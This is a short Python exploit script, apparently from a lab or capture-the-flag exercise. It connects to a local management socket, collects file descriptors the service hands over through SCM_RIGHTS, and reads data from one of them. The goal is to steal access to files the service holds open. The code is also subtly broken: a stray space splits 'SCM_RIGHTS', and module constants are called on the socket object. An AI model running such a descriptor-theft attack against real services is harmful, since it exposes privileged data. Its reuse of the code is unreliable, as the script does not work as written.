#https://offsec.pentest.tools/exploit/printer/raw-printing-pentesting/


import socket
import os
import array

socket_path = "/run/paperwork/mgmt.sock"
msglen=1024 
maxfds=10

if __name__ == "__main__":
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    # notice malice is trigger by connect
    s.connect(socket_path)

    fds = array.array("i") 

    ancbufsize = s.CMSG_LEN(maxfds * fds.itemsize)

    msg, ancdata, flags, addr = s.recvmsg(msglen, ancbufsize)

    received_fds = []

    # Process the ancillary control data messages
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if cmsg_level == s.SOL_SOCKET and cmsg_type == s.SCM_RIGHT S:
            # Drop trailing truncated bytes if any, then parse bytes into ints
            truncated_bytes = len(cmsg_data) % fds.itemsize
            clean_data = cmsg_data[:len(cmsg_data) - truncated_bytes]
            
            fds.frombytes(clean_data)
            received_fds.extend(fds)
    print(received_fds)
    data = os.pread(received_fds[1], 1024, 0)
    print(data)
    s.close()